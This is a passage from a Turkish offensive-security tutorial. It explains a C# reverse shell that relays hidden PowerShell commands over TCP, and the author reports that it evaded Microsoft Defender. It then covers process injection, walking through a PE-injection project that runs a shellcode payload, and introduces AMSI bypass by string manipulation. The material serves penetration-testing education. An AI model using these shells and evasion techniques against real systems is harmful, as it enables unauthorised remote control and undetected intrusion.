while (!userInput.Equals("exit"))
{
userInput = streamReader.ReadLine();
p.StandardInput.WriteLine(userInput);
}
```

- **Amaç**: Kullanıcıdan gelen komutları PowerShell process'ine göndermek.
- **`streamReader.ReadLine()`**: TCP bağlantısından gelen kullanıcı komutunu okur.
- **`p.StandardInput.WriteLine(userInput)`**: Komut, PowerShell’e gönderilir.
- **Çıkış Koşulu**: Kullanıcı "exit" yazdığında, döngü sona erer.


12. Process'in Sonlandırılması

```
p.WaitForExit(); 
client.Close();
```

- **`WaitForExit()`**: PowerShell process'i bitene kadar bekler.
- **`client.Close()`**: TCP bağlantısını kapatır.



13. Çıktı İşleme (HandleDataReceived)

```
private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
{
	if (e.Data != null)
	{

	streamWriter.WriteLine(e.Data);

	streamWriter.Flush();

	}

}
```


- **Amaç**: PowerShell çıktısını TCP bağlantısına iletmek.
- **`e.Data`**: PowerShell’den gelen veriyi temsil eder.
- **`streamWriter.WriteLine(e.Data)`**: Veriyi TCP bağlantısı üzerinden gönderir.

### **Genel Çalışma Mantığı**

1. Kullanıcı, kodu IP ve port parametreleriyle çalıştırır.
2. Kod, bu IP ve porta bir bağlantı kurar.
3. Hedef sistemde gizli bir PowerShell process'i başlatır.
4. Kullanıcı komutları TCP üzerinden gönderir.
5. PowerShell komutları çalıştırır ve sonuçlar TCP bağlantısı üzerinden kullanıcıya iletilir.


Programı çalıştırırken, etkileşimli bir PowerShell oturumu elde ediyoruz ve Microsoft Defender Antivirus tarafından engellenmedik, çünkü malicious olduğu bilinen herhangi bir şey kullanmadık. powershell.exe bir child process olarak ortaya çıktığında process'imizin bellek taramasını yapmaya karar verse bile, bilinen herhangi bir imzayla eşleşmeyeceğimiz için hiçbir şey tespit edilmemelidir.

![Pasted image 20250101184900.png](/img/user/resimler/Pasted%20image%2020250101184900.png)


Özel yapım araçlar kullanmak tespitten kaçmak için en etkili çözüm olsa da, pratikte hem zaman hem de bütçe sınırları vardır. Bu nedenle, sızma test uzmanları, red teamer'lar ve kötü niyetli aktörler, örneğin Rubeus'u yeniden yaratmak mümkün olmadığından, çoğu zaman açık kaynaklı yazılımlar kullanmak zorunda kalırlar.


### Process Injection

[Process injection](https://attack.mitre.org/techniques/T1055/), başka bir prosesin adres alanında kötü amaçlı kod çalıştırmayı gerektiren bir kaçınma tekniğidir. Bunun yapılabileceği birçok yol vardır:

* [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001/): Saldırgan, kötü amaçlı bir DLL'nin yolunu hedef prosesin adres alanına yazar ve ardından [LoadLibrary](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)'yi çağırır.

* [Portable Executable Injection](https://attack.mitre.org/techniques/T1055/002/): Saldırgan, kodu hedef bir prosesin adres alanına kopyalar ve ardından [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) ile çalıştırır.

* [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/): Bir saldırgan hedef prosesi askıya alınmış bir durumda ortaya çıkarır, bellekteki giriş noktasını kendi koduyla değiştirir ve ardından prosesi yeniden başlatır,

* [Thread Execution Hijacking](https://attack.mitre.org/techniques/T1055/003/): Bir saldırgan hedef prosesteki bir thread'i askıya alır, kodu kendi kötü niyetli koduyla değiştirir ve sonra thread'i yeniden başlatır


Bu bölümde, önceki bölümdeki micr0_shell payload'umuzu çalıştırmak için Portable Executable Injection kullanacağız.


### Introduction to Portable Executable Injection

Yukarıda belirtildiği gibi, Portable Executable Injection saldırganların kendi kodlarını hedef prosesin adres alanına kopyaladıkları ve daha sonra çalıştırdıkları bir tekniktir. Bunu başarmanın birden fazla yolu vardır, ancak en yaygın yol aşağıdaki WinAPI işlevlerini kullanmaktır:

* Shellcode'umuz için hedef process'in belleğinde yer ayırmak üzere [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
* Shellcode'umuzu ayrılan alana yazmak için [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

* Shellcode'u hedef proseste çalıştırmak için [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

Parametrelerini inceleyerek her bir WinAPI fonksiyonunun fonksiyonelliğini daha iyi anlayabiliriz:


```
lpBaseAddress = VirtualAllocEx(
hProcess, // Hedef process'in handle değeri
lpAddress, // İstenilen başlangıç adresi veya NULL (kendisi belirlesin diye)
dwSize, // Ayrılacak bellek bölgesinin boyutu (byte cinsinden)
flAllocationType, // Bellek ayırma türü (Commit, Reserve, vb.)
flProtect // Bellek koruma türü (Read/Write, Read/Write/Execute, vb.)
);


WriteProcessMemory(
hProcess, // Hedef process'in handle değeri
lpBaseAddress, // Verinin yazılacağı adres (VirtualAllocEx'in döndürdüğü değer)
lpBuffer, // Shellcode'un olduğu bellek adresi
nSize, // Shellcode'un tampon (buffer) boyutu
*lpNumberOfBytesWritten // Yazılan byte miktarının tutulacağı değişkenin adresi
);



CreateRemoteThread(
hProcess, // Hedef process'in handle değeri
lpThreadAttributes, // Yeni thread'in security handle'ı veya NULL (kendisi belirlesin diye)
dwStackSize, // Stack'in başlangıç boyutu veya NULL (kendisi belirlesin diye)
lpStartAddress, // Thread'in başlangıç adresi (VirtualAllocEx'in döndürdüğü değer)
lpParameter, // Thread'e aktarılacak değişkenin adresi veya değişken yoksa NULL
dwCreationFlags, // Thread'in oluşturulmasını kontrol eden bayrak
lpThreadId // Thread ID'sinin saklanacağı değişkenin adresi veya gerek yoksa NULL
);
```


Bizim durumumuzda, hedef prosesimizi oluşturmak için [CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)'i ve [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)'i kullanacağız, böylece başlangıçta Read/Write bellek koruması ile bellek ayırabilir, shellcode'u yazabilir ve ardından çalıştırmadan önce Read/Execute olarak ayarlayabiliriz. Bu gerekli değildir, ancak bazı antivirüs çözümleri Read/Write/Execute bellek ayrıldığında bunu şüpheli bulur, bu nedenle bu basit bir geçici çözümdür.


### Örnek Olay İncelemesi: AlsoNotMalware

Hadi Visual Studio'yu açalım ve **C# Console App (.NET Framework)** türünde bir proje oluşturalım ve bu projeye **AlsoNotMalware** adını verelim. Daha önce bahsettiğimiz Windows API fonksiyonlarını kullanmadan önce bunları projeye dahil etmemiz gerekecek. **NotMalware** projesinde olduğu gibi, bu projede de **P/Invoke** (Platform Invocation Services) teknolojisini kullanacağız. Bu teknoloji, **managed** (yönetilen) C# kodumuzdan, **unmanaged** (yönetilmeyen) kütüphanelerde bulunan fonksiyonlara erişmemize olanak tanır.

Genel olarak, aşağıdaki tanımlamalara ihtiyacımız olacak:

![Pasted image 20250101194044.png](/img/user/resimler/Pasted%20image%2020250101194044.png)
![Pasted image 20250101194111.png](/img/user/resimler/Pasted%20image%2020250101194111.png)
![Pasted image 20250101194126.png](/img/user/resimler/Pasted%20image%2020250101194126.png)
![Pasted image 20250101194205.png](/img/user/resimler/Pasted%20image%2020250101194205.png)
![Pasted image 20250101194213.png](/img/user/resimler/Pasted%20image%2020250101194213.png)
![Pasted image 20250101194219.png](/img/user/resimler/Pasted%20image%2020250101194219.png)

Referans verilen tüm Windows API'leri ile, main metodunun içine PE enjeksiyonunu gerçekleştirecek asıl mantığı yazabiliriz. İlk olarak shellcode'umuzu tanımlayacağız, bu durumda önceki bölümdeki micr0_shell payload'unu kullanacağız:

![Pasted image 20250101194252.png](/img/user/resimler/Pasted%20image%2020250101194252.png)

Daha sonra, hedef prosesin adres alanı içinde shellcode için Read/Write alanı tahsis edeceğiz:

![Pasted image 20250101194315.png](/img/user/resimler/Pasted%20image%2020250101194315.png)

Shellcode'u VirtualAllocEx'in döndürdüğü adres tarafından sağlanan alana yazacağız

![Pasted image 20250101194332.png](/img/user/resimler/Pasted%20image%2020250101194332.png)

Bunu takiben, tahsis edilen alanın bellek korumasını Read/Execute olarak değiştiriyoruz:

![Pasted image 20250101194355.png](/img/user/resimler/Pasted%20image%2020250101194355.png)

Son olarak, hedef process'in adres alanı içinde shellcode'u çalıştırmak için CreateRemoteThread'i çağırabiliriz:

![Pasted image 20250101194412.png](/img/user/resimler/Pasted%20image%2020250101194412.png)

Her şeyi bir araya getirdikten sonra çözümü oluşturabilir (Release, x64) ve çalıştığını doğrulayabiliriz:

![Pasted image 20250101194452.png](/img/user/resimler/Pasted%20image%2020250101194452.png)

![Pasted image 20250101195421.png](/img/user/resimler/Pasted%20image%2020250101195421.png)



### Antimalware Scan Interface

[Antimalware Scan Interface](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) (AMSI), Windows uygulamalarının kullanılan antimalware yazılımıyla etkileşime geçmek için kullanabileceği standartlaştırılmış bir arayüzdür. Aşağıdaki diyagram ([Microsoft](https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)'tan alınmıştır) yüksek seviyede nasıl çalıştığını göstermektedir - bundan çıkarılması gereken önemli şey, uygulamaların girdiyi (input) malicious içeriğe karşı taramak için [AmsiScanBuffer](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) ve [AmsiScanString](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanstring) fonksiyonlarını kullanabileceğidir.

![Pasted image 20250101200132.png](/img/user/resimler/Pasted%20image%2020250101200132.png)

Herhangi bir uygulama **AMSI**'yi kullanabilse de, bu bölümde özellikle **PowerShell**'e odaklanacağız. Bunun nedeni, birçok ofansif aracın bu dili kullanmasıdır. Örneğin, [**Invoke-Mimikatz.ps1**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) çalıştırılmaya çalışıldığında engellenir. **PowerShell**'in, komutları çalıştırmadan önce **Microsoft Defender Antivirus** ile imza taramaları gerçekleştiren bir mekanizma olarak **AMSI**'yi kullandığını hayal etmek faydalı olabilir.

![Pasted image 20250101200254.png](/img/user/resimler/Pasted%20image%2020250101200254.png)


### Bunu (PowerShell'de) Nasıl Bypass Edebiliriz?

Güvenlik araştırmacıları AMSI'yi atlamaktan bahsettiklerinde, PowerShell'in AmsiScanBuffer ve AmsiScanString fonksiyonlarını kullanmasını engellemekten bahsediyorlar. AMSI'yi atlamak, çalıştırılan komutlar taranmadığı için kötü niyetli eylemlerin gerçekleştirilmesini kolaylaştırır.


### **String Manipulation**

Aşağıdaki birkaç baypasın önemli bir kısmı string manipülasyonu olacaktır. Aşağıdaki ekran görüntüsüne bir göz atın, “amsiUtils” stringi Microsoft Defender Antivirüs'ten gelen bir yanıtı tetiklemektedir. Stringi basitçe iki parçaya bölerek (“amsi” ve “Utils”) ya da base64-encoding kullanarak Microsoft Defender Antivirus'ü atlatmak mümkündür.

![Pasted image 20250101200644.png](/img/user/resimler/Pasted%20image%2020250101200644.png)
